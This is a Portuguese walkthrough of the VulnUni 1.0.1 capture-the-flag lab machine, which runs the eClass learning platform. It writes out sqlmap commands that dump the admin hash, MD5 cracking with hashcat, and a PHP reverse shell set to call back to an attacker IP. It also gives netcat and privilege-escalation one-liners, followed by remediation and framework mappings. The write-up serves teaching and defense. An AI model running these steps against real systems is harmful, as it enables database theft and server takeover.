# VulnUni: 1.0.1 — A Aula Começou, e SQL Injection é o Currículo

Bora rapaziada!! VulnUni roda o eClass, uma plataforma de e-learning open-source, e o formulário de login é um exercício de manual de SQL injection. Você enumera o banco de dados, extrai hashes de admin, quebra no hashcat, loga no painel administrativo, faz upload de uma PHP reverse shell como material de curso, e então escala via SUID ou sudo configurado incorretamente para root. A máquina ensina exatamente o que acontece quando plataformas acadêmicas ignoram validação de entrada: o atacante tira nota máxima em exfiltração de banco de dados. Caramba, essa é literalmente educacional em todo sentido.

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | VulnUni: 1.0.1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/vulnuni-101,439/ |
| **Técnicas** | Descoberta de host, nmap, fingerprinting eClass LMS, SQL injection (sqlmap), quebra de hash MD5, upload PHP autenticado, reverse shell, escalação SUID/sudo |
| **CVEs** | CWE-89 (SQLi no login eClass), CWE-434 (upload irrestrito via admin), CWE-326 (MD5 sem salt), CWE-269 (sudo/SUID misconfigured) |
| **Grupos APT** | APT41: ataca setor educacional via SQL injection e roubo de credenciais |

---

## Resumo do Ataque

```
netdiscover → nmap → HTTP 80 (eClass LMS)
  → enumeração dirb/gobuster
  → login eClass: SQL injection no campo usuário
  → sqlmap: enumerar DBs → eclass DB → tabela user → dump hash admin
  → hashcat -m 0 (MD5) → senha em claro
  → login admin eClass → upload material de curso → shell.php
  → nc -lvnp 4444 → acessar path do upload → reverse shell (www-data)
  → python pty → shell estável
  → sudo -l ou find SUID → escalação GTFOBins
  → flag root
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Fingerprinting da aplicação web: identificação do eClass LMS
3. Enumeração de diretórios com dirb/gobuster
4. Teste de SQL injection no formulário de login eClass
5. Extração automatizada de credenciais com sqlmap
6. Quebra de hash MD5 com hashcat
7. Upload de arquivo PHP autenticado via painel admin eClass
8. Disparo de reverse shell PHP e estabilização do shell
9. Enumeração e exploração para escalação de privilégios
10. Captura da flag root

---

## Passo 1 — Descoberta de Host

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.ALVO
```

**MITRE ATT&CK:** T1040 — Sniffing de Rede (descoberta passiva)

---

## Passo 2 — Scan de Portas e Fingerprinting de Serviços

```bash
nmap -A -p- 192.168.1.ALVO
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
22/tcp open  ssh     OpenSSH 7.x
```

Identificar versão do eClass:

```bash
curl -s http://192.168.1.ALVO/CHANGES | head -20
curl -s http://192.168.1.ALVO/ | grep -i "eclass\|version"
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Enumeração da Aplicação Web

```bash
gobuster dir \
  -u http://192.168.1.ALVO \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html \
  -t 30
```

Caminhos-chave no eClass:

```
/modules/auth/index.php    → formulário de login (alvo SQLi)
/courses/                  → diretório de cursos (destino de uploads)
/admin/                    → interface administrativa
```

Testar o campo usuário manualmente:

```
admin'--
admin' OR '1'='1
```

Uma página em branco ou erro diferente de "credenciais inválidas" confirma SQLi.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — SQL Injection: Extração de Credenciais com sqlmap

Capturar os parâmetros POST do login (Burp Suite ou devtools):

```
POST /modules/auth/index.php
username=admin&password=test&submit=Login
```

Rodar sqlmap:

```bash
sqlmap -u "http://192.168.1.ALVO/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       --dbs \
       --batch

sqlmap -u "http://192.168.1.ALVO/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass --tables \
       --batch

sqlmap -u "http://192.168.1.ALVO/modules/auth/index.php" \
       --data="username=admin&password=test&submit=Login" \
       -D eclass -T user --dump \
       --batch
```

Resultado:

```
admin : [HASH_MD5]
```

**Nota real:** SQL injection em portais de e-learning é consistentemente encontrado em avaliações de universidades e redes de ensino. Plataformas como eClass e Moodle tiveram múltiplas vulnerabilidades SQLi. Instituições acadêmicas ficam meses atrás dos ciclos de patch corporativos.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública

---

## Passo 5 — Quebrar Hash MD5

```bash
echo "[HASH_MD5]" > /tmp/hash.txt
hashcat -m 0 -d 1 -w 3 -O /tmp/hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 /tmp/hash.txt --show
```

MD5 é um hash rápido: GPUs modernas quebram bilhões de hashes MD5 por segundo. Uma senha típica de 8 caracteres do rockyou.txt cai em segundos.

**Alternativa com john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 /tmp/hash.txt
john --show --format=raw-md5 /tmp/hash.txt
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 6 — Upload de PHP Reverse Shell Autenticado

Login no painel admin eClass com as credenciais quebradas. Navegar até administração de cursos:

```
Dashboard → Cursos → [Selecionar curso] → Material → Upload
```

Preparar a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar /tmp/shell.php:
# $ip = '192.168.1.ATACANTE';
# $port = 4444;
```

Fazer upload de `shell.php` via interface de upload de material de curso. Localizar o arquivo:

```bash
gobuster dir -u http://192.168.1.ALVO/courses/ -w /usr/share/wordlists/dirb/common.txt
```

**MITRE ATT&CK:** T1105 — Transferência de Ferramenta via Ingresso

---

## Passo 7 — Disparar Reverse Shell e Estabilizar

```bash
nc -lvnp 4444
curl http://192.168.1.ALVO/courses/[caminho]/shell.php
```

Shell chega como `www-data`. Estabilizar:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z no atacante, depois:
stty raw -echo; fg
# Enter duas vezes
```

**MITRE ATT&CK:** T1059.004 — Shell Unix

---

## Passo 8 — Escalação de Privilégios

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
uname -a
```

**Caminhos comuns:**

Caminho A (sudo misconfigured):

```bash
sudo python -c 'import os; os.system("/bin/bash")'
```

Caminho B (SUID em python/perl):

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Caminho C (kernel exploit):

```bash
# Ubuntu 14.04 → CVE-2015-1328 (overlayfs), CVE-2016-5195 (DirtyCow)
searchsploit ubuntu 14.04 privilege
```

```bash
id
# uid=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Aula encerrada. gg

**MITRE ATT&CK:** T1548.003 — Sudo; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Observações |
|---|---|---|---|
| Hash admin | (MD5 do sqlmap) | eclass DB, tabela user | MD5 sem salt |
| Senha admin | (quebrada do hash) | hashcat + rockyou | Login eClass admin |
| Flag root | (varia por instância) | /root/flag.txt | Após privesc |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | SQL injection no login eClass expõe todas as credenciais | eClass e plataformas similares tiveram múltiplas SQLi; setor educacional é alvo frequente | Usar queries parametrizadas; nunca concatenar input do usuário em SQL |
| 2 | MD5 sem salt para armazenamento de senhas | MD5 é quebrado criptograficamente; ataques GPU exaurem rockyou em segundos | Usar bcrypt, argon2 ou scrypt com fator de custo adequado |
| 3 | Upload de arquivo autenticado executa PHP arbitrário | Qualquer admin autenticado pode fazer upload de uma reverse shell | Validar por MIME, extensão e magic bytes; armazenar uploads fora do web root; desabilitar PHP em diretórios de upload |
| 4 | sudo/SUID misconfigured habilita root instantâneo | Permissões sudo excessivamente amplas eliminam a barreira de escalonamento | Auditar sudoers; remover SUID de interpretadores não-essenciais |
| 5 | Setor educacional como alvo de alto valor | Universidades hospedam dados de pesquisa, PII de estudantes e dados financeiros; ciclos de patch mais lentos | Implementar programa de gestão de vulnerabilidades; priorizar patching de aplicações expostas à internet |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Quebra de Senha | T1110.002 |
| Execução | Execução | Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalação de Privilégios | Escalação de Privilégios | Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. Corrigir SQL injection: substituir concatenação de strings no login eClass por prepared statements PDO
2. Atualizar hashing de senhas: migrar de MD5 para bcrypt; forçar reset de senha para todos os usuários
3. Restringir upload de arquivo: validar por MIME, extensão e magic bytes; armazenar uploads fora do web root; desabilitar PHP em diretórios de material de curso
4. Auditar sudo e SUID: remover grants NOPASSWD; revogar SUID de binários não-essenciais
5. Atualizar eClass: instalar última versão; monitorar security advisories
6. Segmentação de rede: isolar o LMS de redes internas; aplicar regras WAF para padrões de SQL injection

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instâncias LMS; avaliar status de patch |
| Proteger | Controle de Acesso | Corrigir SQLi; restringir uploads; desabilitar PHP em diretórios de upload |
| Proteger | Segurança de Dados | Migrar para bcrypt; criptografar dados sensíveis em repouso |
| Detectar | Anomalias e Eventos | Implantar WAF; alertar em padrões sqlmap e queries SQL em massa |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas via SQL injection |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir paths de upload; negar execução PHP em diretórios de upload |
| IA-5 | Gestão de Autenticadores | Migrar de MD5 para bcrypt; complexidade de senha |
| SI-10 | Validação de Entrada | Parametrizar todas as queries; sanitizar todo input do usuário |
| CM-7 | Menor Funcionalidade | Desabilitar handler PHP em diretórios de upload |

### CISA KEV

SQL injection em plataformas CMS e LMS está documentado em múltiplos advisories CISA. A combinação de SQLi, roubo de credencial e upload RCE mapeia diretamente para técnicas usadas em ataques ao setor educacional documentados no advisory conjunto CISA/FBI AA22-074A.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais e Autenticação | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Consciência Situacional (SA) | Monitorar Logs e Eventos | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (queries parametrizadas; restrições de upload)
- **D3-HBPI** — Integridade do Pipeline de Build (SAST para SQLi no codebase eClass)
- **D3-OAM** — Gestão Administrativa do SO (hardening sudo; auditoria SUID)

---

## Considerações Finais

VulnUni: 1.0.1 é uma máquina excelente para praticar uma cadeia completa e realista de ataque em aplicação web. SQL injection para roubo de credencial para upload autenticado para escalação de privilégios: essa é exatamente a sequência documentada em comprometimentos reais de LMS. O setor educacional está consistentemente entre os setores mais atacados precisamente porque instituições como esta rodam software desatualizado com credenciais fracas em servidores expostos à internet.

A ironia de uma máquina "universidade" onde SQL injection é a lição principal não passa despercebida. Aula encerrada.

Thanks guys!! (❍ᴥ❍ʋ)
